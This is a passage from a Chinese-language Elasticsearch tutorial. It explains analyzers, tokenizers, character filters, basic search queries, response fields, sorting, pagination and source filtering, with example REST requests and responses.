Analyzer</h5><p>Standard分析器是内置的默认分析器，是安装Unicode文本分割算法来对文本进行分割成多个词，它会移除一些标点符号、词小写、支持一些暂停词。</p><p>有如下几个参数</p><p><code>max_token_length</code>(默认255)：如果一个词长度大于这个值，就会将词按这个长度切割，比如hello这个词，max_token_length为4的话会被切割成hell和o两个。</p><p><code>stopwords</code>(默认<em>NONE</em>)：暂停词，表示会主动删除一些经常出现的词，比如stopwords为_english_的时候会排除the这种出现比较多的词。</p><p><code>stopwords_path</code>：指定包含一些暂停词的文件。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;analysis&quot;: &#123;</span><br><span class="line">      &quot;analyzer&quot;: &#123;</span><br><span class="line">        &quot;my_english_analyzer&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;standard&quot;,</span><br><span class="line">          &quot;max_token_length&quot;: 5,</span><br><span class="line">          &quot;stopwords&quot;: &quot;_english_&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST my-index-000001/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;my_english_analyzer&quot;,</span><br><span class="line">  &quot;text&quot;: &quot;The 2 QUICK Brown-Foxes jumped over the lazy dog&#x27;s bone.&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--- response ---</span><br><span class="line">[ 2, quick, brown, foxes, jumpe, d, over, lazy, dog&#x27;s, bone ]</span><br></pre></td></tr></table></figure><h5 id="Simple-Analyzer"><a href="#Simple-Analyzer" class="headerlink" title="Simple Analyzer"></a>Simple Analyzer</h5><p>Simple分析器按照非字母字符来切割，比如说数字、空格、连字符等，丢弃非字母的字符，全部转换为小写。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST _analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;simple&quot;,</span><br><span class="line">  &quot;text&quot;: &quot;The 2 QUICK Brown-Foxes jumped over the lazy dog&#x27;s bone.&quot;</span><br><span class="line">&#125;</span><br><span class="line">--- response ---</span><br><span class="line">[ the, quick, brown, foxes, jumped, over, the, lazy, dog, s, bone ]</span><br></pre></td></tr></table></figure><h5 id="WhiteSpace-Analyzer"><a href="#WhiteSpace-Analyzer" class="headerlink" title="WhiteSpace Analyzer"></a>WhiteSpace Analyzer</h5><p>WhiteSpace分析器按照空白字符切割。</p><h5 id="Stop-Analyzer"><a href="#Stop-Analyzer" class="headerlink" title="Stop Analyzer"></a>Stop Analyzer</h5><p>Stop analyzer 和 Simple analyzer差不多，唯一多了一个功能就是支持stop words，有stopwords和stopwords_path两个参数。</p><h5 id="Keyword-Analyzer"><a href="#Keyword-Analyzer" class="headerlink" title="Keyword Analyzer"></a>Keyword Analyzer</h5><p>不分词，就将全部当成一个词。</p><h5 id="Pattern-Analyzer"><a href="#Pattern-Analyzer" class="headerlink" title="Pattern Analyzer"></a>Pattern Analyzer</h5><p>支持正则的分词器，默认值<code>\W+</code>。</p><p>参数有pattern、flags、lowercase（默认true）、stopwords（默认_none_）、stopwords_path</p><h4 id="分词器"><a href="#分词器" class="headerlink" title="分词器"></a>分词器</h4><h5 id="Letter-Tokenizer"><a href="#Letter-Tokenizer" class="headerlink" title="Letter Tokenizer"></a>Letter Tokenizer</h5><p>按照非字母分词。</p><h5 id="Lowercase-Tokenizer"><a href="#Lowercase-Tokenizer" class="headerlink" title="Lowercase Tokenizer"></a>Lowercase Tokenizer</h5><p>Letter Tokenizer加小写。</p><h5 id="Pattern-Tokenizer"><a href="#Pattern-Tokenizer" class="headerlink" title="Pattern Tokenizer"></a>Pattern Tokenizer</h5><p>按照正则的内容进行切割，默认<code>\w+</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;analysis&quot;: &#123;</span><br><span class="line">      &quot;analyzer&quot;: &#123;</span><br><span class="line">        &quot;my_analyzer&quot;: &#123;</span><br><span class="line">          &quot;tokenizer&quot;: &quot;my_tokenizer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;tokenizer&quot;: &#123;</span><br><span class="line">        &quot;my_tokenizer&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;pattern&quot;,</span><br><span class="line">          &quot;pattern&quot;: &quot;,&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST my-index-000001/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;my_analyzer&quot;,</span><br><span class="line">  &quot;text&quot;: &quot;comma,separated,values&quot;</span><br><span class="line">&#125;</span><br><span class="line">--- response ---</span><br><span class="line">[ comma, separated, values ]</span><br></pre></td></tr></table></figure><h5 id="Simple-Pattern-Tokenizer"><a href="#Simple-Pattern-Tokenizer" class="headerlink" title="Simple Pattern Tokenizer"></a>Simple Pattern Tokenizer</h5><p>将正则表达式捕获的内容当做词，默认是空字符串。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;analysis&quot;: &#123;</span><br><span class="line">      &quot;analyzer&quot;: &#123;</span><br><span class="line">        &quot;my_analyzer&quot;: &#123;</span><br><span class="line">          &quot;tokenizer&quot;: &quot;my_tokenizer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;tokenizer&quot;: &#123;</span><br><span class="line">        &quot;my_tokenizer&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;simple_pattern&quot;,</span><br><span class="line">          &quot;pattern&quot;: &quot;[0123456789]&#123;3&#125;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST my-index-000001/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;my_analyzer&quot;,</span><br><span class="line">  &quot;text&quot;: &quot;fd-786-335-514-x&quot;</span><br><span class="line">&#125;</span><br><span class="line">--- response ---</span><br><span class="line">[ 786, 335, 514 ]</span><br></pre></td></tr></table></figure><h5 id="Simple-Pattern-Split-Tokenizer"><a href="#Simple-Pattern-Split-Tokenizer" class="headerlink" title="Simple Pattern Split Tokenizer"></a>Simple Pattern Split Tokenizer</h5><p>按照正则切割生成词，功能比Pattern和Simple Pattern受限，但是效率更高，默认是空字符串。</p><p>和Pattern Tokenizer的区别就是使用的是Lucene的正则表达式，没有java强大，但是效率更高。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;analysis&quot;: &#123;</span><br><span class="line">      &quot;analyzer&quot;: &#123;</span><br><span class="line">        &quot;my_analyzer&quot;: &#123;</span><br><span class="line">          &quot;tokenizer&quot;: &quot;my_tokenizer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;tokenizer&quot;: &#123;</span><br><span class="line">        &quot;my_tokenizer&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;simple_pattern_split&quot;,</span><br><span class="line">          &quot;pattern&quot;: &quot;_&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST my-index-000001/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;my_analyzer&quot;,</span><br><span class="line">  &quot;text&quot;: &quot;an_underscored_phrase&quot;</span><br><span class="line">&#125;</span><br><span class="line">--- response ---</span><br><span class="line">[ an, underscored, phrase ]</span><br></pre></td></tr></table></figure><h5 id="Standrad-Tokenizer"><a href="#Standrad-Tokenizer" class="headerlink" title="Standrad Tokenizer"></a>Standrad Tokenizer</h5><p>基于Unicode的文本切割算法，对很多语言很友好。</p><p>参数<code>max_token_length</code>：最大分词长度。</p><h4 id="字符过滤（Character-Filter）"><a href="#字符过滤（Character-Filter）" class="headerlink" title="字符过滤（Character Filter）"></a>字符过滤（Character Filter）</h4><h5 id="HTML-strip-character-filter"><a href="#HTML-strip-character-filter" class="headerlink" title="HTML strip character filter"></a>HTML strip character filter</h5><p>对html的标签进行过滤</p><h5 id="Mapping-character-filter"><a href="#Mapping-character-filter" class="headerlink" title="Mapping character filter"></a>Mapping character filter</h5><p>映射过滤，比如将a映射成b。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">GET /_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;tokenizer&quot;: &quot;keyword&quot;,</span><br><span class="line">  &quot;char_filter&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;type&quot;: &quot;mapping&quot;,</span><br><span class="line">      &quot;mappings&quot;: [</span><br><span class="line">        &quot;٠ =&gt; 0&quot;,</span><br><span class="line">        &quot;١ =&gt; 1&quot;,</span><br><span class="line">        &quot;٢ =&gt; 2&quot;,</span><br><span class="line">        &quot;٣ =&gt; 3&quot;,</span><br><span class="line">        &quot;٤ =&gt; 4&quot;,</span><br><span class="line">        &quot;٥ =&gt; 5&quot;,</span><br><span class="line">        &quot;٦ =&gt; 6&quot;,</span><br><span class="line">        &quot;٧ =&gt; 7&quot;,</span><br><span class="line">        &quot;٨ =&gt; 8&quot;,</span><br><span class="line">        &quot;٩ =&gt; 9&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;text&quot;: &quot;My license plate is ٢٥٠١٥&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Pattern-replace-character-filter"><a href="#Pattern-replace-character-filter" class="headerlink" title="Pattern replace character filter"></a>Pattern replace character filter</h5><p>正则替换</p><h4 id="Normalizers"><a href="#Normalizers" class="headerlink" title="Normalizers"></a>Normalizers</h4><p>normalizers和tokenizer的区别就是他只针对单个词。</p><h3 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h3><h4 id="简单查询"><a href="#简单查询" class="headerlink" title="简单查询"></a>简单查询</h4><p>查询my-index-000001索引里面的user.id为kimchy的数据。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;user.id&quot;: &quot;kimchy&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会返回以下结果</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;took&quot;: 5, </span><br><span class="line">  &quot;timed_out&quot;: false,</span><br><span class="line">  &quot;_shards&quot;: &#123;</span><br><span class="line">    &quot;total&quot;: 1,</span><br><span class="line">    &quot;successful&quot;: 1,</span><br><span class="line">    &quot;skipped&quot;: 0,</span><br><span class="line">    &quot;failed&quot;: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;hits&quot;: &#123;</span><br><span class="line">    &quot;total&quot;: &#123;</span><br><span class="line">      &quot;value&quot;: 1,</span><br><span class="line">      &quot;relation&quot;: &quot;eq&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;max_score&quot;: 1.3862942,</span><br><span class="line">    &quot;hits&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot;: &quot;my-index-000001&quot;,</span><br><span class="line">        &quot;_id&quot;: &quot;kxWFcnMByiguvud1Z8vC&quot;,</span><br><span class="line">        &quot;_score&quot;: 1.3862942,</span><br><span class="line">        &quot;_source&quot;: &#123;</span><br><span class="line">          &quot;@timestamp&quot;: &quot;2099-11-15T14:12:12&quot;,</span><br><span class="line">          &quot;http&quot;: &#123;</span><br><span class="line">            &quot;request&quot;: &#123;</span><br><span class="line">              &quot;method&quot;: &quot;get&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;response&quot;: &#123;</span><br><span class="line">              &quot;bytes&quot;: 1070000,</span><br><span class="line">              &quot;status_code&quot;: 200</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;version&quot;: &quot;1.1&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;message&quot;: &quot;GET /search HTTP/1.1 200 1070000&quot;,</span><br><span class="line">          &quot;source&quot;: &#123;</span><br><span class="line">            &quot;ip&quot;: &quot;127.0.0.1&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;user&quot;: &#123;</span><br><span class="line">            &quot;id&quot;: &quot;kimchy&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  took：此次查询的耗时，单位毫秒。</li></ul><p>计算的是协调节点收到请求到协调节点准备响应之间的时间。</p><p>took time包括：</p><p>1、协调节点和数据节点的通信时间。</p><p>2、请求在搜索线程池花费的时间以及排队等待执行的时间。</p><p>3、真实执行的时间。</p><p>不包括：</p><p>1、发送请求到es的时间。</p><p>2、序列化响应的时间。</p><p>3、发送响应到客户端的时间。</p><ul><li>  timed_out 如果超时会为ture，超时可能返回部分结果或者空。</li><li>_shards 此次请求的分片情况。<ul><li>  total 需要查询的分片数量，包括未分配的分片。</li><li>  successful 执行请求成功的分片数量。</li><li>  skipped 填过请求的分片数量，有个轻量级的检查帮忙识别索要查询的文档是不是在这个分片里面，这通常发生在范围查找，</li><li>  failed 执行请求失败的分片数量，一些分片没有被分配可能会引起failed + successful &lt; total的情况。</li></ul></li><li>hits 包括返回的文档和元数据信息。<ul><li>total<ul><li>  value 返回的文档数量。</li><li>  relation 关系 eq、 gte。</li></ul></li><li>  max_score 文档返回的最高分数，如果不按照_score排序为null。</li><li>hits<ul><li>  _index 文档所在的索引名。</li><li>  _id 返回文档的统一标识符。</li><li>  _score 得分。</li><li>  _source 具体的数据，json格式的。</li></ul></li></ul></li></ul><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><h5 id="简单排序"><a href="#简单排序" class="headerlink" title="简单排序"></a>简单排序</h5><p>可以通过一个或多个字段来排序，也可以有特殊字段如_score排序得分，_doc排序索引。</p><p>创建一个索引。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">      &quot;post_date&quot;: &#123; &quot;type&quot;: &quot;date&quot; &#125;,</span><br><span class="line">      &quot;user&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;name&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;age&quot;: &#123; &quot;type&quot;: &quot;integer&quot; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>  format：对排序字段进行处理。</p></li><li><p>  asc：升序</p></li><li><p>  desc：降序</p></li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sort&quot; : [</span><br><span class="line">    &#123; &quot;post_date&quot; : &#123;&quot;order&quot; : &quot;asc&quot;, &quot;format&quot;: &quot;strict_date_optional_time_nanos&quot;&#125;&#125;,</span><br><span class="line">    &quot;user&quot;,</span><br><span class="line">    &#123; &quot;name&quot; : &quot;desc&quot; &#125;,</span><br><span class="line">    &#123; &quot;age&quot; : &quot;desc&quot; &#125;,</span><br><span class="line">    &quot;_score&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;query&quot; : &#123;</span><br><span class="line">    &quot;term&quot; : &#123; &quot;user&quot; : &quot;kimchy&quot; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="mode选项"><a href="#mode选项" class="headerlink" title="mode选项"></a>mode选项</h5><p>使用mode支持对array的排序，支持min、max、sum、avg、median操作，排序为asc的时候mode默认为min，排序为desc的时候mode默认为max。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /my-index-000001/_doc/1?refresh</span><br><span class="line">&#123;</span><br><span class="line">   &quot;product&quot;: &quot;chocolate&quot;,</span><br><span class="line">   &quot;price&quot;: [20, 4]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST /_search</span><br><span class="line">&#123;</span><br><span class="line">   &quot;query&quot; : &#123;</span><br><span class="line">      &quot;term&quot; : &#123; &quot;product&quot; : &quot;chocolate&quot; &#125;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;sort&quot; : [</span><br><span class="line">      &#123;&quot;price&quot; : &#123;&quot;order&quot; : &quot;asc&quot;, &quot;mode&quot; : &quot;avg&quot;&#125;&#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="numeric-type"><a href="#numeric-type" class="headerlink" title="numeric_type"></a>numeric_type</h5><p>两个索引查询的时候用于统一排序字段类型。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PUT /index_double</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">      &quot;field&quot;: &#123; &quot;type&quot;: &quot;double&quot; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT /index_long</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">      &quot;field&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST /index_long,index_double/_search</span><br><span class="line">&#123;</span><br><span class="line">   &quot;sort&quot; : [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;field&quot; : &#123;</span><br><span class="line">            &quot;numeric_type&quot; : &quot;double&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Missing-values"><a href="#Missing-values" class="headerlink" title="Missing values"></a>Missing values</h5><p>可以将missing参数设置成_last或者_first，不设置默认为_last。</p><h4 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h4><p>es默认返回10个数据，可以用from和size来进行分页。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;from&quot;: 5,</span><br><span class="line">  &quot;size&quot;: 20,</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;user.id&quot;: &quot;kimchy&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="返回对应的字段"><a href="#返回对应的字段" class="headerlink" title="返回对应的字段"></a>返回对应的字段</h4><h5 id="field字段"><a href="#field字段" class="headerlink" title="field字段"></a>field字段</h5><p>field字段既包含文档数据又包含索引映射。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;user.id&quot;: &quot;kimchy&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;fields&quot;: [</span><br><span class="line">    &quot;user.id&quot;,</span><br><span class="line">    &quot;http.response.*&quot;,         </span><br><span class="line">    &#123;</span><br><span class="line">      &quot;field&quot;: &quot;@timestamp&quot;,</span><br><span class="line">      &quot;format&quot;: &quot;epoch_millis&quot; </span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;_source&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="source字段"><a href="#source字段" class="headerlink" title="_source字段"></a>_source字段</h5><p>_source指定为false，表示没有source字段返回。</p><p>_source可以支持正则。</p><p>_source可以支持数组+正则。</p><p>_source支持includes和excludes。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;_source&quot;: &#123;</span><br><span class="line">    &quot;includes&quot;: [ &quot;obj1.*&quot;, &quot;obj2.*&quot; ],</span><br><span class="line">    &quot;excludes&quot;: [ &quot;*.description&quot; ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;term&quot;: &#123;</span><br><span class="line">      &quot;user.id&quot;: &quot;kimchy&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从多个索引中搜索。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /my-index-000001,my-index-000002/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;user.id&quot;: &quot;kimchy&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET /my-index-*/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;user.id&quot;: 